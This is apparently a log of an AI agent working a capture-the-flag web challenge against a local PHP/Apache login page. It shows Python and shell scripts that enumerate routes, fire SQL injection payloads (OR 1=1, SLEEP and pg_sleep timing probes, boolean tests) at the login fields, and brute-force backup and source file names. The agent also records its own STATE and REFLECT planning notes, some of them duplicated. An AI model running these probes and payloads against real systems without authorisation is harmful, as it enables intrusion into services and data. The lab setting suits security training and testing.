find . -maxdepth 3 -type f -print; echo '--- batch read configs/sources (expected empty)'; for f in $(find . -type f \( -name '*.cfg' -o -name '*.conf' -o -name '*.ini' -o -name 'Dockerfile*' -o -name '*.yml' -o -name '*.yaml' -o -name '*.py' -o -name '*.js' -o -name '*.ts' -o -name '*.go' -o -name '*.c' -o -name '*.cpp' -o -name '*.h' -o -name '*.rs' -o -name '*.java' -o -name '*.php' -o -name '*.rb' -o -name '*.sh' -o -name '*.txt' \) | head -50); do echo "=== $f ==="; cat "$f"; done | head -500 ITER2 black-box/source inventory --- batch read configs/sources (expected empty) --- iter 3 bash --- $ python3 <<'PY' import requests,re,hashlib,urllib.parse base='http://127.0.0.1:9100' paths=['/','/robots.txt','/sitemap.xml','/api','/admin','/debug','/healthz','/login','/login.php','/search','/search.php','/.git/HEAD','/backup','/register','/profile','/static','/assets'] s=requests.Session() for p in paths: try: r=s.get(base+p,timeout=5,allow_redirects=False) print(f'=== GET {p} -> {r.status_code} len={len(r.content)} sha={hashlib.sha256(r.content).hexdigest()[:12]}') print('Headers:', {k:v for k,v in r.headers.items() if k.lower() in ['server','x-powered-by','set-cookie','location','content-type']}) txt=r.text[:600].replace('\n','\\n') print(txt) except Exception as e: print('ERR',p,e) print('--- harvest from /') r=s.get(base+'/') html=r.text for pat in [r'href=["\']([^"\']+)', r'src=["\']([^"\']+)', r'action=["\']([^"\']+)', r'(?:fetch|axios\.[a-z]+)\(["\']([^"\']+)']: for m in re.findall(pat,html): print('HARV',m) PY === GET / -> 200 len=3108 sha=b450d4a12edc Headers: {'Server': 'Apache/2.4.25 (Debian)', 'X-Powered-By': 'PHP/5.6.40', 'Content-Type': 'text/html; TXT python3 <<'PY' import requests,hashlib,time base='http://127.0.0.1:9100/index.php' tests=[ ('empty',{}), ('blank',{'username':'','password':''}), ('admin_admin',{'username':'admin','password':'admin'}), ('homer_homer',{'username':'homer','password':'homer'}), ('single_quote_user',{'username':"'",'password':'x'}), ('single_quote_pass',{'username':'x','password':"'"}), ('sqli_or_user',{'username':"admin' OR '1'='1'-- -",'password':'x'}), ('sqli_or_both',{'username':"' OR 1=1-- -",'password':'anything'}), ] s=requests.Session() for name,data in tests: t=time.time(); r=s.post(base,data=data,timeout=10,allow_redirects=False); dt=time.time()-t body=r.text print(f'=== {name} status={r.status_code} len={len(r.content)} sha={hashlib.sha256(r.content).hexdigest()[:12]} time={dt:.3f}') print('headers',{k:v for k,v in r.headers.items() if k.lower() in ['set-cookie','location','content-type']}) # print notable lines excluding CSS mostly for line in body.splitlines(): if any(w.lower() in line.lower() for w in ['welcome','invalid','error','flag','admin','success','login','password','username','warning','sql']): print(line.strip()) print(body[-500:].replace('\n','\\n')) PY STATE (iter 4): - CONFIRMED: index.php has only POST login form with username/password; /static/ 403 but background readable; Apache 2.4.25 + PHP 5.6.40; no links/JS in page. - REFUTED: separate /login(.php), /admin, /api, /debug common paths absent as direct GETs (iter3); static directory listing denied (iter4). - OPEN: [1] POST login auth bypass/SQLi; [2] source/backup disclosure around index/static; [3] session/cookie tampering after login; [4] verbose errors from malformed POST/GET; [5] PHP/Apache path quirks. - NEXT: establish login response oracle with baseline, common creds, malformed quotes, and simple auth-bypass payloads. === empty status=200 len=3108 sha=b450d4a12edc time=0.025 headers {'Content-Type': 'text/html; charset=UTF-8'} input[type="text"], input[type="password"] {

REFLECT (iter 5 / 30): - PROGRESS: 20% of attack chain; login sink identified but no auth oracle beyond generic denial. - DEAD ENDS: direct common routes; static listing; trivial OR SQLi; displayed SQL errors via single quote. - PIVOT: test blind behavior and then broaden file/route discovery if uniform. - WHY MISSED: risk of anchoring on login SQLi; compensate by probing source/backup and PHP endpoints after blind ladder. TXT python3 <<'PY' import requests,time,hashlib base='http://127.0.0.1:9100/index.php' payloads=[ ('base',{'username':'u','password':'p'}), ('u_mysql_sleep',{'username':"u' AND SLEEP(5)-- -",'password':'p'}), ('p_mysql_sleep',{'username':'u','password':"p' AND SLEEP(5)-- -"}), ('u_mysql_or_sleep',{'username':"u' OR SLEEP(5)-- -",'password':'p'}), ('p_mysql_or_sleep',{'username':'u','password':"p' OR SLEEP(5)-- -"}), ('u_pg_sleep',{'username':"u';SELECT pg_sleep(5)-- -",'password':'p'}), ('p_pg_sleep',{'username':'u','password':"p';SELECT pg_sleep(5)-- -"}), ('u_bool_true',{'username':"u' AND 1=1-- -",'password':'p'}), ('u_bool_false',{'username':"u' AND 1=2-- -",'password':'p'}), ('p_bool_true',{'username':'u','password':"p' AND 1=1-- -"}), ('p_bool_false',{'username':'u','password':"p' AND 1=2-- -"}), ] for name,data in payloads: t=time.time() try: r=requests.post(base,data=data,timeout=8) dt=time.time()-t print(f'{name}: status={r.status_code} len={len(r.content)} sha={hashlib.sha256(r.content).hexdigest()[:12]} dt={dt:.3f}') except Exception as e: print(f'{name}: ERR {type(e).__name__} after {time.time()-t:.3f}: {e}') PY STATE (iter 5): - CONFIRMED: POST with any supplied username/password produces same 3178-byte denial: "Access Restricted to Internal Employees only"; no Set-Cookie/redirect; simple quote and OR payloads did not change response. - REFUTED: trivial visible SQL error and basic OR auth bypass payloads tried in username (iter5) are not sufficient. - OPEN: [1] blind SQLi/time in username or password; [2] exact credential/logic condition; [3] hidden file/source disclosure; [4] GET parameter not yet known; [5] PHP upload/static quirks unlikely but unprobed. - NEXT: perform blind ladder on each POST field independently with time, boolean, and error variants. REFLECT (iter 5 / 30): - PROGRESS: 20% of attack chain; login sink identified but no auth oracle beyond generic denial. - DEAD ENDS: direct common routes; static listing; trivial OR SQLi; displayed SQL errors via single quote. - PIVOT: test blind behavior and then broaden file/route discovery if uniform. - WHY MISSED: risk of anchoring on login SQLi; compensate by probing source/backup and PHP endpoints after blind ladder. base: status=200 len=3178 sha=88fced975ecf dt=0.009 u_mysql_sleep: status=200 len=3178 sha=88fced975ecf dt=0.022 p_mysql_sleep: status=200 len=3178 sha=88fced975ecf dt=0.003 u_mysql_or_sleep: status=200 len=3178 sha=88fced975ecf dt=0.002 p_mysql_or_sleep: status=200 len=3178 sha=88fced975ecf dt=0.003 u_pg_sleep: status=200 len=3178 sha=88fced975ecf dt=0.002 p_pg_sleep: status=200 len=3178 sha=88fced975ecf dt=0.002 u_bool_true: status=200 len=3178 sha=88fced975ecf dt=0.001 u_bool_false: status=200 len=3178 sha=88fced975ecf dt=0.001 p_bool_true: status=200 len=3178 sha=88fced975ecf dt=0.002 p_bool_false: status=200 len=3178 sha=88fced975ecf dt=0.002 [stderr] /Users/faber/Library/Python/3.9/lib/python/site-packages/urllib3/__init__.py:35: NotOpenSSLWarning: urllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with 'LibreSSL 2.8.3'. See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 7 bash --- $ cat <<'TXT' STATE (iter 6): - CONFIRMED: blind ladder on both POST fields showed no timing/status/length delta for MySQL/Postgres sleep or boolean probes; POST denial deterministic. - REFUTED: visible SQLi, basic OR auth bypass, and straightforward blind SQLi on username/password (iter5-6); avoid more SQLi variants now. - OPEN: [1] IP/header-based privilege gate suggested by "Internal Employees only"; [2] source/backup disclosure; [3] default/hidden PHP files; [4] credential guessing/Simpsons names; [5] cookie/session absent unless successful login. - NEXT: broaden discovery for backup/source/default files and image metadata before further login attacks. TXT python3 <<'PY' import requests,hashlib,concurrent.futures,os base='http://127.0.0.1:9100' paths=[] roots=['index','config','db','database','connect','conn','auth','login','admin','flag','backup','bak','old','test','dev','debug','phpinfo','info','employee','employees','internal','portal','home'] exts=['.php','.php~','.bak','.old','.save','.swp','.swo','.txt','.inc','.conf','.sql','.zip','.tar.gz','.tar','.7z','.rar'] for r in roots: for e in exts: paths.append('/'+r+e) paths += ['/server-status','/phpinfo.php','/info.php','/.env','/.htaccess','/.htpasswd','/composer.json','/composer.lock','/vendor/','/uploads/','/static/index.php','/static/flag.txt','/static/.htaccess','/index.php.bak','/index.phps','/index.php%7e'] seen=set() def fetch(p): try: r=requests.get(base+p,timeout=3,allow_redirects=False) return p,r.status_code,len(r.content),hashlib.sha256(r.content).hexdigest()[:10],r.headers.get('content-type',''),r.text[:120].replace('\n',' ') if 'text' in r.headers.get('content-type','') or len(r.content)<1000 else r.content[:20].hex() except Exception as e: return p,'ERR',0,'','',str(e) with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex: for p,st,l,sha,ct,prev in ex.map(fetch,paths): key=(st,l,sha) interesting = st not in [404] or (st==404 and l not in [278,280,281,282,283,284,285,286]) if interesting: print(f'{p:25} {st} len={l} sha={sha} ct={ct} :: {prev}') PY # image quick metadata/embedded strings curl -s http://127.0.0.1:9100/static/springfield_background.jpg -o /tmp/springfield.jpg && file /tmp/springfield.jpg && strings -n 8 /tmp/springfield.jpg | grep -Ei 'flag|user|pass|auth|internal|comment|php|spring|admin' | head -50 STATE (iter 6): - CONFIRMED: blind ladder on both POST fields showed no timing/status/length delta for MySQL/Postgres sleep or boolean probes; POST denial deterministic. - REFUTED: visible SQLi, basic OR auth bypass, and straightforward blind SQLi on username/password (iter5-6); avoid more SQLi variants now. - OPEN: [1] IP/header-based privilege gate suggested by "Internal Employees only";
